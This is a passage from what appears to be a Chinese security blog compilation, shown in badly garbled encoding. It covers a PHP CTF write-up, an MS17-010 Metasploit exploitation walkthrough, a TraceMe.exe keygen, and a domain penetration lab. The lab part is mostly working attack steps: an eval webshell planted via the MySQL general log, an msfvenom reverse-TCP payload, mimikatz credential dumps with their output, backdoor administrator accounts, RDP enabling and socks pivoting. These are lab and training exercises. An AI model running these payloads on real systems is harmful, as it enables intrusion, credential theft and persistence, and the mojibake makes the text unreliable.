$_SERVER[&#39;HTTP_REFERER&#39;]ï¼Œå®ƒæ˜¯è·å–å½“å‰é¡µé¢çš„urlã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œ$_SERVER[â€˜HTTP_REFERERâ€™]å®Œå…¨æ¥æºäºæµè§ˆå™¨ã€‚å¹¶ä¸æ˜¯æ‰€æœ‰çš„ç”¨æˆ·ä»£ç†ï¼ˆæµè§ˆå™¨ï¼‰éƒ½ä¼šè®¾ç½®è¿™ä¸ªå˜é‡ï¼Œè€Œä¸”æœ‰çš„è¿˜å¯ä»¥æ‰‹å·¥ä¿®æ”¹ HTTP_REFERERã€‚å› æ­¤ï¼Œ$_SERVER[â€˜HTTP_REFERERâ€™] æ˜¯å¯ä»¥ä¼ªé€ çš„ã€‚$_SERVER[â€˜HTTP_REFERERâ€™]å¯¹ POST è¡¨å•è®¿é—®ä¹Ÿæ˜¯æœ‰æ•ˆçš„æˆ‘ä»¬æƒ³åŠæ³•æäº¤ç±»ä¼¼ config[dbhost]=127.0.0.1 è¿™æ ·ç±»å‹çš„æ•°æ®ï¼Œè¿™æ ·å› æ­¤æˆ‘ä»¬å¯ä»¥æ§åˆ¶è¿æ¥çš„æ•°æ®åº“ï¼Œå¯¼è‡´ç½‘ç«™å‡ºç°é”™è¯¯æ˜¾ç¤ºã€‚ CTFé¢˜ç›® index.php //index.php &lt;?php $a = â€œhongriâ€; $id = $_GET[&#x27;id&#x27;]; @parse_str($id); if ($a[0] != &#x27;QNKCDZO&#x27; &amp;&amp; md5($a[0]) == md5(&#x27;QNKCDZO&#x27;)) &#123; echo &#x27;&lt;a href=&quot;upload.php&quot;&gt;flag is here&lt;/a&gt;&#x27;; &#125; ?&gt; upload.php &lt;?php header(&quot;Content-type:text/html;charset=utf-8&quot;); $referer = $_SERVER[&#x27;HTTP_REFERER&#x27;]; if(isset($referer)!== false) &#123; $savepath = &quot;uploads/&quot; . sha1($_SERVER[&#x27;REMOTE_ADDR&#x27;]) . &quot;/&quot;; if (!is_dir($savepath)) &#123; $oldmask = umask(0); mkdir($savepath, 0777, true); umask($oldmask); &#125; if ((@$_GET[&#x27;filename&#x27;]) &amp;&amp; (@$_GET[&#x27;content&#x27;])) &#123; //$fp = fopen(&quot;$savepath&quot;.$_GET[&#x27;filename&#x27;], &#x27;w&#x27;); $content = &#x27;HRCTF&#123;y0u_n4ed_f4st&#125; by:l1nk3r&#x27;; file_put_contents(&quot;$savepath&quot; . $_GET[&#x27;filename&#x27;], $content); $msg = &#x27;Flag is here,come on~ &#x27; . $savepath . htmlspecialchars($_GET[&#x27;filename&#x27;]) . &quot;&quot;; echo $msg; usleep(100000); $content = &quot;Too slow!&quot;; file_put_contents(&quot;$savepath&quot; . $_GET[&#x27;filename&#x27;], $content); &#125; print &lt;&lt;&lt;EOT &lt;form action=&quot;&quot; method=&quot;get&quot;&gt; &lt;div class=&quot;form-group&quot;&gt; &lt;label for=&quot;exampleInputEmail1&quot;&gt;Filename&lt;/label&gt; &lt;input type=&quot;text&quot; class=&quot;form-control&quot; name=&quot;filename&quot; id=&quot;exampleInputEmail1&quot; placeholder=&quot;Filename&quot;&gt; &lt;/div&gt; &lt;div class=&quot;form-group&quot;&gt; &lt;label for=&quot;exampleInputPassword1&quot;&gt;Content&lt;/label&gt; &lt;input type=&quot;text&quot; class=&quot;form-control&quot; name=&quot;content&quot; id=&quot;exampleInputPassword1&quot; placeholder=&quot;Contont&quot;&gt; &lt;/div&gt; &lt;button type=&quot;submit&quot; class=&quot;btn btn-default&quot;&gt;Submit&lt;/button&gt; &lt;/form&gt; EOT; &#125; else&#123; echo &#x27;you can not see this page&#x27;; &#125; ç¬¬ä¸€å…³ åœ¨index.phpå†…æœ‰å¦‚ä¸‹; $id = $_GET[&#x27;id&#x27;]; @parse_str($id); if ($a[0] != &#x27;QNKCDZO&#x27; &amp;&amp; md5($a[0]) == md5(&#x27;QNKCDZO&#x27;)) &#123; echo &#x27;&lt;a href=&quot;upload.php&quot;&gt;flag is here&lt;/a&gt;&#x27;; å¯æƒ³è€ŒçŸ¥æˆ‘ä»¬éœ€è¦ç”¨å˜é‡è¦†ç›–ï¼Œpayloadä¸ºï¼š ?id=a[0]=s878926199a å°±ä¼šå‡ºæ¥ä¸€ä¸ªé“¾æ¥ï¼Œç‚¹å‡»å°±åˆ°äº†uploadé¡µé¢ã€‚å¦‚æœæˆ‘ä»¬ç›´æ¥è®¿é—®uploadä¼šæŠ¥é”™ï¼Œå› ä¸ºæœ‰å¦‚ä¸‹ä»£ç ï¼š $referer = $_SERVER[&#x27;HTTP_REFERER&#x27;]; if(isset($referer)!== false) å½“æˆ‘ä»¬æ˜¯é€šè¿‡aæ ‡ç­¾é“¾æ¥è¿‡å»çš„ä¼šè‡ªåŠ¨å¸¦ä¸Šreferå­—æ®µã€‚ ç¬¬äºŒå…³ uplaodä¸»è¦ä»£ç ï¼š if ((@$_GET[&#x27;filename&#x27;]) &amp;&amp; (@$_GET[&#x27;content&#x27;])) &#123; //$fp = fopen(&quot;$savepath&quot;.$_GET[&#x27;filename&#x27;], &#x27;w&#x27;); $content = &#x27;HRCTF&#123;y0u_n4ed_f4st&#125; by:l1nk3r&#x27;; file_put_contents(&quot;$savepath&quot; . $_GET[&#x27;filename&#x27;], $content); $msg = &#x27;Flag is here,come on~ &#x27; . $savepath . htmlspecialchars($_GET[&#x27;filename&#x27;]) . &quot;&quot;; echo $msg; usleep(100000);//å»¶è¿Ÿ $content = &quot;Too slow!&quot;; file_put_contents(&quot;$savepath&quot; . $_GET[&#x27;filename&#x27;], $content); &#125; å¯ä»¥å‘ç°ä¼šæˆ‘ä»¬ä¼ å…¥çš„filenameä¼šå›ºå®šçš„å­˜å‚¨åœ¨ä¸€ä¸ªå›ºå®šçš„ä½ç½®ï¼Œè€Œè¿™ä¸ªä½ç½®ä¼šåœ¨è¾“å‡ºä¸­å¾—åˆ°ã€‚è€Œæ–‡ä»¶çš„å†…å®¹å…ˆæ˜¯flagç„¶åå»¶è¿Ÿä¸€ä¸‹é©¬ä¸Šæ›¿æ¢ä¸ºäº† Too slow! ã€‚å…¶å®è¾“å…¥çš„contentå¹¶æ²¡ä»»ä½•ä½œç”¨ã€‚æ€è·¯ï¼šæˆ‘ä»¬ä¸€ç›´ä¸Šä¼ åŒä¸€ä¸ªæ–‡ä»¶åï¼Œç„¶åä½¿ç”¨pythonæˆ–è€…pbä¸æ–­çš„è®¿é—®è¿™ä¸ªæ–‡ä»¶ã€‚å¦‚æœå¤Ÿå¿«å°±ä¸ä¼šæŠŠæ–‡æœ¬å†…å®¹æ›¿æ¢ä¸º Too slow! è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥è®¿é—®åˆ°flag MS17-010æ¼æ´åˆ©ç”¨æ¼”ç¤º1.å‡†å¤‡å·¥ä½œå¼€å¯ä¸¤å°è™šæ‹Ÿæœºï¼Œä¸€å°kaliä½œä¸ºæ”»å‡»æ–¹ï¼Œä¸€å°win7ä½œä¸ºè¢«æ”»å‡»æ–¹ å°†ä¸¤å°è™šæ‹Ÿæœºæ¡¥æ¥åˆ°åŒä¸€ç½‘å¡ï¼Œå¹¶ä¿è¯èƒ½å¤Ÿé€šä¿¡ Kali IP 192.168.164.143 win7 IP 192.168.164.135 ä½¿ç”¨pingæµ‹è¯•å³å¯ ä½¿ç”¨msfå‰éœ€è¦å¼€å¯postgresqlæœåŠ¡ å¼€å¯æœåŠ¡ï¼š service postgresql start æŸ¥çœ‹æœåŠ¡çŠ¶æ€ï¼š service postgresql status å¼€åˆ°ç»¿è‰²å­—ä½“çš„activeå³ä¸ºå¼€å¯äº† åˆå§‹åŒ–æ•°æ®åº“ï¼š msfdb init 2. æ”»å‡»è¿‡ç¨‹(1).é¦–å…ˆåˆ¤æ–­ç›®æ ‡ä¸»æœºæ˜¯å¦æ‰“å¼€445ç«¯å£ ä½¿ç”¨nmap+ip æ‰«æ (2) .ç¡®è®¤ç›®æ ‡ä¸»æœºæ‰“å¼€445ç«¯å£åç›´æ¥ä½¿ç”¨msfè¿›è¡Œæ”»å‡» è¾“å…¥msfconsole å¯åŠ¨msf è¾“å…¥search MS17-010 æ‰¾åˆ°exploit windows/smb/ms17_010_eternalblue, è¿è¡Œ use exploitwindows/smb/ms17_010_eternalblue è¾“å…¥ show options æŸ¥çœ‹éœ€è¦é…ç½®å“ªäº›ä¿¡æ¯ RHOSTS ä¸ºç›®æ ‡ä¸»æœºIP(10.1.1.2) RPORT ä¸ºç›®æ ‡ç«¯å£å·(445) LHOST ä¸ºç›‘å¬ä¸»æœºIP(10.1.1.1) (3). é…ç½®æˆåŠŸåè®¾ç½®tcpè¿æ¥ è¾“å…¥å‘½ä»¤ set payload windows/x64/meterpreter/reverse_tcp (4).å¼€å§‹è¿è¡Œ è¾“å…¥ exploit/run æˆåŠŸè·å–shell æŸ¥çœ‹ipåœ°å€éªŒè¯æ˜¯å¦ä¸ºç›®æ ‡ä¸»æœºã€‚ (5)è®¾ç«‹åé—¨ï¼Œåœ¨ç›®æ ‡ä¸»æœºä¸­åˆ›å»ºä¸€ä¸ªç”¨æˆ· åˆ›å»ºä¸€ä¸ªç”¨æˆ· net user test abc123.com /add Username:test password:abc123.com å°†è¯¥ç”¨æˆ·åŠ å…¥ç®¡ç†å‘˜ç»„ï¼Œä½¿å…¶æ‹¥æœ‰ç®¡ç†å‘˜æƒé™ net localgroup administrtors test /add ç›®æ ‡ä¸»æœºä¸Šç”¨æˆ·åˆ›å»ºæˆåŠŸ å®éªŒç»“æŸ TraceMe.exeæ³¨å†Œæœºæ‰“å¼€ç¨‹åºï¼Œéšä¾¿è¯•ä¸€è¯• é€šè¿‡ODæ‰“å¼€è¯¥ç¨‹åºï¼Œå®ƒä¼šè‡ªåŠ¨å®šä½åˆ°æ¨¡å—å…¥å£ç‚¹0x004013A0ä½ç½®ï¼Œä¹Ÿå°±æ˜¯éªŒè¯å‡½æ•°çš„å†…å®¹ æ•°æ®è¡¨ä¸­405030çš„æ•°æ®ï¼Œç¨‹åºä¸­éœ€è¦ç”¨åˆ° æ±‡ç¼–ä»£ç çš„å¦‚ä¸‹ 00401340 /$ 55 push ebp 00401341 |. 8B6C24 0C mov ebp,dword ptr ss:[esp+0xC] ;ebp = ç”¨æˆ·å 00401345 |. 56 push esi ; TraceMe.0040504F 00401346 |. 57 push edi 00401347 |. 8B7C24 18 mov edi,dword ptr ss:[esp+0x18] ;edi = ç”¨æˆ·åçš„é•¿åº¦ 0040134B |. B9 03000000 mov ecx,0x3 ;ecx = ä»ç”¨æˆ·åçš„ç¬¬å››ä¸ªå­—ç¬¦å¼€å§‹è®¡ç®— 00401350 |. 33F6 xor esi,esi ;esi = 0 = è®¡ç®—å‡ºçš„æ³¨å†Œç  ; TraceMe.0040504F 00401352 |. 33C0 xor eax,eax ;eax = 0,ç”¨äºè®¡æ•°ï¼Œè¯»å–æ•°æ®è¡¨çš„ç¬¬eaxä¸ªå­—èŠ‚ 00401354 |. 3BF9 cmp edi,ecx ;if(edi &gt; ecx) 00401356 |. 7E 21 jle short ;&#123; TraceMe.00401379 00401358 |. 53 push ebx 00401359 |&gt; 83F8 07 /cmp eax,0x7 ; if(eax &gt; 7) 0040135C |. 7E 02 |jle short TraceMe.00401360 0040135E |. 33C0 |xor eax,eax ;&#123;eax = 0;&#125; 00401360 |&gt; 33D2 |xor edx,edx ;edx = 0; 00401362 |. 33DB |xor ebx,ebx ;ebx = 0 00401364 |. 8A1429 |mov dl,byte ptr ds:[ecx+ebp] ; dl = ebp + ecx = ä»ç”¨æˆ·åçš„ç¬¬å››ä¸ªå­—ç¬¦å¼€å§‹è®¡ç®— 00401367 |. 8A98 30504000 |mov bl,byte ptr ds:[eax+0x405030] ;bl = æ•°æ®è¡¨ç¬¬eaxä¸ªå­—ç¬¦ï¼Œæ•°æ®è¡¨çš„å†…å­˜åœ°å€ä¸º0x00405030å¤„ï¼ŒæŸ¥æ‰¾å…¶æ•°å€¼ä¸º0C 0A 13 09 0C 0B 0A 08(æ ¹æ®åˆ¤æ–­è¯­å¥0x00401359å¯çŸ¥ï¼Œåªæœ‰8ä¸ªæ•°æ®) 0040136D |. 0FAFD3 |imul edx,ebx ;edx = edx * ebx 00401370 |. 03F2 |add esi,edx ;esi = esi + edx 00401372 |. 41 |inc ecx ;ecx++ 00401373 |. 40 |inc eax ;eax++; 00401374 |. 3BCF |cmp ecx,edi ;if(ecx&lt;edi) å¦‚æœæœªå–å®Œç”¨æˆ·åå­—ç¬¦åˆ™ç»§ç»­ 00401376 |.^ 7C E1 \\jl short ;&#123;goto 0x00401359&#125; TraceMe.00401359 00401378 |. 5B pop ebx ;è®¡ç®—ç»“æŸ ; 0012FAE8 00401379 |&gt; 56 push esi ; /&lt;%ld&gt; = 40504F (4214863.) ä½¿ç”¨pythonå†™å‡ºæ³¨å†Œæœº def crake_traceme(): code, len = 0, 0 username = input(&quot;è¾“å…¥ç”¨æˆ·å&quot;) num = [0x0C, 0x0A, 0x13, 0x09, 0x0C, 0x0B, 0x0A, 0x08] for i in range(3, len(username)): if len &gt; 7: len = 0 code += ord(username[i]) * num[len] len += 1 print(&quot;The code is:\\n&quot; + str(code)) crake_traceme() ) ä¸€æ¬¡åŸŸæ¸—é€æµ‹è¯•æ”»å‡»ç¬¬ä¸€æ¬¡åšæ¸—é€æµ‹è¯•ï¼Œæœ‰çš„åœ°æ–¹åšçš„ä¸æ˜¯å¾ˆå¥½ ç¯å¢ƒæ­å»ºä½¿ç”¨çš„é¶æœºæ˜¯çº¢æ—¥å®‰å…¨æä¾›çš„ï¼Œåœ°å€ï¼šhttp://vulnstack.qiyuanxuetang.net/vuln/detail/2/ æ­å»ºè¿‡ç¨‹ä¸­æœ‰ä¸€ç‚¹éœ€è¦æ³¨æ„ WebæœåŠ¡ä¸»æœºwin7æœ‰ä¸¤å—ç½‘å¡ï¼Œéœ€è¦åœ¨è®¾ç½®ä¸­å†æ·»åŠ ä¸€å—ç½‘å¡ ç½‘å¡ä¸€è¿æ¥åˆ°VMnet2ä¸­ï¼Œä½œä¸ºå†…ç½‘ç¯å¢ƒ ç½‘å¡äºŒè¿æ¥åˆ°VMnet1ä¸­ï¼Œä½œä¸ºå…¬ç½‘ç¯å¢ƒï¼Œå¹¶æ”»å‡»æœºè¿åˆ°VMnet1ä¸­,ç¡®ä¿å…¶å¯ä»¥è®¿é—®ç½‘ç«™ä¸»é¡µ å‰©ä¸‹çš„ä¸¤å°åŸŸæ§ä¸»æœºç›´æ¥è¿æ¥åˆ°VMnet2ä¸­å³å¯ï¼Œå¯ä»¥ä¸webæœåŠ¡å™¨é€šä¿¡ ä¿®æ”¹window10ç‰©ç†æœºçš„VMnet1ç½‘å¡ è¿™æ ·ç‰©ç†æœºå’Œkaliéƒ½å¯ä»¥è®¿é—®åˆ°é¶æœºç½‘ç«™ å®éªŒæ‹“æ‰‘å›¾: webæœåŠ¡å™¨(win7): å…¬ç½‘IP:192.168.74.128 å†…ç½‘IP: 192.168.52.143 ä¸»æœºå:stu1 åŸŸæˆå‘˜ä¸»æœº(Windows Server 2003)ï¼š192.168.52.141 ä¸»æœºåï¼šroot-tvi862ubeh åŸŸæ§(Windows Server 2008)ï¼š192.168.52.138 ä¸»æœºåï¼šowa webæœåŠ¡å™¨æœ‰ä¸¤å—ç½‘å¡ï¼Œå…¶ä¸­192.168.74.128æ¨¡æ‹Ÿçš„æ˜¯å…¬ç½‘ç¯å¢ƒï¼Œæ”»å‡»è€…å¯ä»¥ç›´æ¥è®¿é—®ï¼Œ192.168.52.143å±äºå†…ç½‘ï¼Œæ”»å‡»è€…æ— æ³•ç›´æ¥è®¿é—® æ¸—é€è¿‡ç¨‹ç½‘ç«™æ¢æµ‹é¦–å…ˆè®¿é—®ç½‘ç«™ä¸»é¡µ: http://192.168.74.129/yxcms å…ˆæ‰«æä¸€ä¸‹ç›®å½• å¯ä»¥çœ‹å­˜åœ¨å¾ˆå¤šå¯ä»¥è®¿é—®çš„ç›®å½•ï¼Œå¹¶ä¸”è¿™äº›ç›®å½•éƒ½å­˜åœ¨ç›®å½•éå†æ¼æ´ï¼Œå¦‚/public,å¯ä»¥çœ‹åˆ°è¯¥ç›®å½•ä¸‹çš„å¾ˆå¤šå†…å®¹ï¼Œä½†æ˜¯æ²¡æœ‰æƒ³è¦å†…å®¹ ç½‘ç«™æ¼æ´åˆ©ç”¨getshell ç»è¿‡æ¢æµ‹ç½‘ç«™çš„åå°ç™»å½•é¡µé¢æ˜¯http://192.168.74.129/yxcms/index.php?r=admin/index/login ç»è¿‡çˆ†ç ´å¾ˆå®¹æ˜“è¯•å‡ºå¯†ç ä¸º123456 æˆåŠŸç™»å½•åå° å°è¯•æœç´¢ç½‘ç«™å·²å‘ç°çš„æ¼æ´ è¿™æ˜¯ä¸€ä¸ªç½‘ç«™å¸¸ç”¨çš„CMSï¼Œåœ¨ç½‘ä¸Šæœç´¢ä¸€ä¸‹æ˜¯å¦å­˜åœ¨å¯ä»¥ç›´æ¥åˆ©ç”¨çš„æ¼æ´ ä»£ç å®¡è®¡| yxcms app 1.4.6 æ¼æ´é›†åˆ å¯ä»¥çœ‹åˆ°è¿™ä¸ªcmsè¿˜æ˜¯å­˜åœ¨å‡ ä¸ªå¾ˆå¥½åˆ©ç”¨çš„æ¼æ´çš„ï¼Œå°è¯•ä½¿ç”¨å…¶ä¸­æ–‡ä»¶å†™å…¥æ¼æ´ è®¿é—®http://192.168.74.129/yxcms/index.php?r=admin/set/tpadd&amp;Mname=defaultï¼Œè¿™é‡Œå¯ä»¥å†™å…¥phpæ–‡ä»¶ å†™å…¥ä¸€å¥è¯æœ¨é©¬ å†™å…¥æˆåŠŸåï¼Œè®¿é—®http://192.168.74.129/yxcms/protected/apps/default/view/default/info.phpå¯ä»¥çœ‹åˆ°å·²ç»æˆåŠŸå†™å…¥ä¸€å¥è¯æœ¨é©¬ï¼Œä¹‹åå°±æ˜¯ç”¨èšå‰‘è¿æ¥ æˆåŠŸè·å–shellï¼Œå¹¶ä¸”æ˜¯systemæƒé™ï¼Œè¿™æ˜¯ç”±äºè¯¥ç½‘ç«™ç®¡ç†å‘˜ç›´æ¥ä½¿ç”¨administratorç™»å½•åŸŸæ§ä¸»æœºï¼Œè‹¥æ˜¯åœ¨çœŸæ˜¯ç¯å¢ƒä¸­è·å–çš„æ˜¯æ™®é€šç”¨æˆ·æƒé™åˆ™è¿˜éœ€è¦é…åˆææƒï¼Œè·å–systemæƒé™ ä½¿ç”¨phpMyAdmin Getshellæ‰«æhttp://192.168.74.129/ ç›´æ¥ä½¿ç”¨å·¥å…·çˆ†ç ´ï¼Œå¾ˆå®¹æ˜“å¾—åˆ°ï¼Œç”¨æˆ·åå’Œå¯†ç éƒ½ä¸ºroot ä¸€å¼€å§‹çš„æƒ³æ³•æ˜¯åˆ©ç”¨å†™into outfileå†™æœ¨é©¬getshellï¼Œä½†æ˜¯ç”±äºç½‘ç«™çš„secure_file_privçš„å€¼ä¸ºNULLï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸èƒ½åˆ©ç”¨å†™into outfileå†™æœ¨é©¬getshell ä½†æ˜¯è¿˜æœ‰ä¸€ç§æ–¹æ³•ï¼Œå°±æ˜¯å‘mysqlæ—¥å¿—ä¸­å†™å…¥ä¸€å¥è¯æœ¨é©¬ï¼Œå…·ä½“å¦‚ä¸‹:mysqlæ—¥å¿—æœ¨é©¬ æ‰§è¡Œä¸‹åˆ—å‘½ä»¤ set global general_log&#x3D;on; #å¼€å¯æ—¥å¿— set global general_log_file&#x3D;&#39;C:&#x2F;phpstudy&#x2F;www&#x2F;yxcms&#x2F;hack.php&#39;; #è®¾ç½®æŒ‡å®šæ–‡ä»¶ä¸ºç½‘ç«™æ—¥å¿—å­˜æ”¾æ–‡ä»¶ SELECT &#39;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#39; #æ‰§è¡Œè¯¥è¯­å¥ï¼Œä¼šå°†è¯¥å‘½ä»¤å†™å…¥æ—¥å¿—æ–‡ä»¶ æ‰§è¡Œå®Œå‘½ä»¤ï¼Œä¾¿å¯ä»¥åœ¨ç½‘ç«™æ ¹ç›®å½•ä¸‹çœ‹åˆ°hack.php æµè§ˆå™¨è®¿é—®http://192.168.74.129/yxcms/hack.phpï¼Œä¸€å¥è¯æœ¨é©¬è®¿é—®æˆåŠŸ åæ¸—é€æ”»å‡»åœ¨æ‹¿åˆ°äº†WebæœåŠ¡å™¨çš„æƒé™åï¼Œæˆ‘ä»¬å°±è¦å°½å¯èƒ½å¤šçš„æœé›†è¯¥æœåŠ¡å™¨çš„ä¿¡æ¯ï¼Œç„¶åæ­å»ºéš§é“é€šå¾€å†…ç½‘ã€‚ æ‰§è¡Œwhoami ,ipconfig,net localgroup administratorså‘½ä»¤æˆ‘ä»¬çŸ¥é“å½“å‰çš„ç”¨æˆ·èº«ä»½æ˜¯ administrator ï¼Œåœ¨ç®¡ç†å‘˜ç»„ä¸­ï¼Œå¹¶ä¸”å¤„åœ¨åŸŸ god ä¸­ã€‚è¯¥ä¸»æœºæœ‰ä¸¤å¼ ç½‘å¡ï¼Œåˆ†åˆ«æ˜¯ï¼š192.168.74.129ï¼Œ192.168.52.143 è·å–MSF shellä½¿ç”¨msfç”Ÿæˆæœ¨é©¬ kaliç»ˆç«¯è¾“å…¥msfconsoleï¼Œè¿›å…¥msf é€‰æ‹©å¸¦reverseå’Œmeterpreter(å‘é€ç«¯æ¥å—ç«¯è¿æ¥)çš„payloadsè¿›è¡Œåå¼¹ç«¯å£ use windows/x64/meterpreter_reverse_tcp è¾“å…¥show optionsæŸ¥çœ‹æ–¹æ³• æ–°å¼€ä¸€ä¸ªç»ˆç«¯è¾“å…¥ä»¥ä¸‹å‘½ä»¤ï¼Œç”Ÿæˆæœ¨é©¬æ–‡ä»¶ï¼Œå¹¶åˆ©ç”¨èšå‰‘ä¸Šä¼ åˆ°ç›®æ ‡ä¸»æœºä¸­ msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=192.168.74.130 lport=4444 -f exe -o 1.exe å†æ¬¡è¾“å…¥msfconsole è¿›å…¥åº”ç”¨ï¼Œè¾“å…¥use exploit/multi/handlerè¿›å…¥ç®¡ç†å·¥å…·ï¼Œè·å–shellæƒé™ï¼Œå‘½ä»¤å¦‚ä¸‹ use exploit/multi/handler set payload windows/x64/meterpreter_reverse_tcp set lhost kali&#x27;s ip run å³å¯è·å–shell è·å–å¯†ç åœ¨meterpreterä¸­è¿è¡Œrun windows/gather/smart_hashdump,ä½†æ˜¯å‡ºç°é”™è¯¯ï¼Œæç¤ºéœ€è¦systemè¿›ç¨‹æƒé™ ä½¿ç”¨migrate 388å°†meterpreterè¿ç§»åˆ°64ä½çš„è¿›ç¨‹ï¼Œè€Œä¸”è¯¥è¿›ç¨‹ä¹Ÿéœ€è¦æ˜¯systemæƒé™è¿è¡Œçš„ å†ä½¿ç”¨run windows/gather/smart_hashdump æ¥ä¸‹æ¥æ˜¯ç ´è§£è¯¥å¯†ç  åŠ è½½ kiwiæ¨¡å— load kiwi creds_all ç»“æœå¦‚ä¸‹ meterpreter &gt; creds_all [+] Running as SYSTEM [*] Retrieving all credentials msv credentials =============== Username Domain LM NTLM SHA1 -------- ------ -- ---- ---- Administrator GOD edea194d76c77d87840ac10a764c7362 8a963371a63944419ec1adf687bb1be5 343f44056ed02360aead5618dd42e4614b5f70cf STU1$ GOD cde51539f42c2854d74e82db1173dd8c 50950d918317edf0ab95661a565c6ebf1151fe3b wdigest credentials =================== Username Domain Password -------- ------ -------- (null) (null) (null) Administrator GOD hongrisec@2019 STU1$ GOD 81 c2 84 7c a6 0f 51 4b 41 91 b3 1a 0d 7e 56 32 0e 37 c7 77 f7 54 09 f4 f2 8b 54 cc 6b 20 7e 9c 56 46 e5 ee d9 d2 84 aa 6a 82 82 58 b1 ae bf 47 db 9f 53 9e c9 a1 5f bb ae a2 c3 7f 2d 37 9d c1 9a 25 95 f6 49 b8 a2 f1 cb 0a ad f2 b2 27 c8 36 b2 eb a5 d9 3c 10 ca 0c 38 18 63 fb 0d 7f 67 ec 37 87 84 e9 cc f3 d8 56 72 bc 0c cf e8 20 a7 93 07 29 3d b5 48 b6 33 de e9 df 3a 73 04 94 a7 90 e6 d5 4f ce a8 88 9e a5 18 78 e4 43 e8 5b e5 47 dc 0a 34 be 79 6a fa fe 7f d5 c6 38 48 79 53 7b 3f 8f 9e 78 31 cf 35 7b 12 93 e7 3a f1 0c de 90 d9 e5 69 02 a9 ab c6 da f2 09 2f 8a 0a ed 19 44 11 c4 ba 93 12 73 04 69 3a 31 4e ff b8 a7 72 da 4b 6e ad db e9 52 7f 88 cf 0f 01 92 87 68 ba 5a d1 d3 ec 1f c3 b1 a5 3b 44 e5 7b 9d 2f a9 28 5b tspkg credentials ================= Username Domain Password -------- ------ -------- Administrator GOD hongrisec@2019 kerberos credentials ==================== Username Domain Password -------- ------ -------- (null) (null) (null) Administrator GOD.ORG hongrisec@2019 stu1$ GOD.ORG 81 c2 84 7c a6 0f 51 4b 41 91 b3 1a 0d 7e 56 32 0e 37 c7 77 f7 54 09 f4 f2 8b 54 cc 6b 20 7e 9c 56 46 e5 ee d9 d2 84 aa 6a 82 82 58 b1 ae bf 47 db 9f 53 9e c9 a1 5f bb ae a2 c3 7f 2d 37 9d c1 9a 25 95 f6 49 b8 a2 f1 cb 0a ad f2 b2 27 c8 36 b2 eb a5 d9 3c 10 ca 0c 38 18 63 fb 0d 7f 67 ec 37 87 84 e9 cc f3 d8 56 72 bc 0c cf e8 20 a7 93 07 29 3d b5 48 b6 33 de e9 df 3a 73 04 94 a7 90 e6 d5 4f ce a8 88 9e a5 18 78 e4 43 e8 5b e5 47 dc 0a 34 be 79 6a fa fe 7f d5 c6 38 48 79 53 7b 3f 8f 9e 78 31 cf 35 7b 12 93 e7 3a f1 0c de 90 d9 e5 69 02 a9 ab c6 da f2 09 2f 8a 0a ed 19 44 11 c4 ba 93 12 73 04 69 3a 31 4e ff b8 a7 72 da 4b 6e ad db e9 52 7f 88 cf 0f 01 92 87 68 ba 5a d1 d3 ec 1f c3 b1 a5 3b 44 e5 7b 9d 2f a9 28 5b å¯ä»¥çœ‹åˆ°å¯†ç å·²ç»è¢«ç ´è§£å¤„ç† passwordï¼šhongrisec@2019 è¿œç¨‹æ¡Œé¢ç™»å½•å·²ç»è·å¾—äº†administratorçš„è´¦å·å’Œå¯†ç ï¼Œç°åœ¨æˆ‘ä»¬æ—¢å¯ä»¥ä½¿ç”¨administratorè´¦å·ç™»å½•ï¼Œä¹Ÿå¯ä»¥æ–°å»ºè´¦å·ç™»å½•ã€‚ ç›´æ¥ä½¿ç”¨administratorç™»å½•çš„è¯å¯èƒ½è¢«ç®¡ç†å‘˜å‘ç°ï¼Œæ‰€ä»¥ä½¿ç”¨ç¬¬äºŒç§æ–¹æ³• net user hack password /add net localgroup administrators hack /add æŸ¥çœ‹ä¸»æœºæ˜¯å¦å¼€å¯3389ç«¯å£ nmap -p 3389 -v 192.168.74.129 å¯ä»¥å‘ç°æ˜¯å…³é—­çš„ã€‚ ä½¿ç”¨meterpreter,æ‰“å¼€è¯¥ç«¯å£(è¿è¡Œä¹‹å‰å¥½åƒéœ€è¦é‡æ–°å¼¹å‡ºshell,ç›´æ¥è¿è¡Œæ²¡æœ‰æˆåŠŸ) run post/windows/manage/enable_rdp å†æ¬¡æ‰«æå°±ä¼šå‘ç°3389ç«¯å£å·²ç»æ‰“å¼€ ç›´æ¥è¿æ¥å³å¯ æ·»åŠ è·¯ç”±ã€æŒ‚Socks4aä»£ç† æ·»åŠ è·¯ç”±çš„ç›®çš„æ˜¯ä¸ºäº†è®©æˆ‘ä»¬çš„MSFå…¶ä»–æ¨¡å—èƒ½è®¿é—®å†…ç½‘çš„å…¶ä»–ä¸»æœº æ·»åŠ socks4aä»£ç†çš„ç›®çš„æ˜¯ä¸ºäº†è®©å…¶ä»–è½¯ä»¶æ›´æ–¹ä¾¿çš„è®¿é—®åˆ°å†…ç½‘çš„å…¶ä»–ä¸»æœºçš„æœåŠ¡ æ³¨ï¼šæ·»åŠ è·¯ç”±ä¸€å®šè¦åœ¨æŒ‚ä»£ç†ä¹‹å‰ï¼Œå› ä¸ºä»£ç†éœ€è¦ç”¨åˆ°è·¯ç”±åŠŸèƒ½ åœ¨è·å–shellçš„æœºå™¨ä¸Šæ·»åŠ è·¯ç”± meterpreter &gt; run get_local_subnets meterpreter &gt; run autoroute -s 192.168.21.0/24 # æ·»åŠ è·¯ç”± meterpreter &gt; run autoroute -p # æ˜¾ç¤ºè·¯ç”± meterpreter &gt; route flush # åˆ é™¤ ä½¿ç”¨run post/windows/gather/arp_scanner RHOSTS=192.168.21.0/24ï¼ŒæŸ¥çœ‹å­˜æ´»çš„ä¸»æœº ç„¶åå»ºç«‹socks4ä»£ç† meterpreter &gt; background msf5 exploit(multi/handler) &gt; use auxiliary/server/socks4a msf5 auxiliary(server/socks4a) &gt; set srvhost 127.0.0.1 msf5 auxiliary(server/socks4a) &gt; set srvport 1080 msf5 auxiliary(server/socks4a) &gt; run è®¾ç½®å®Œä»£ç†åæ”»å‡»è€…ä¸»æœºå°±å¯ä»¥è®¿é—®å†…ç½‘äº† åŸŸä¿¡æ¯æ”¶é›†net time /domain #æŸ¥çœ‹æ—¶é—´æœåŠ¡å™¨ net user /domain #æŸ¥çœ‹åŸŸç”¨æˆ· net view /domain #æŸ¥çœ‹æœ‰å‡ ä¸ªåŸŸ net group &quot;domain computers&quot; /domain #æŸ¥çœ‹åŸŸå†…æ‰€æœ‰çš„ä¸»æœºå net group &quot;domain admins&quot; /domain 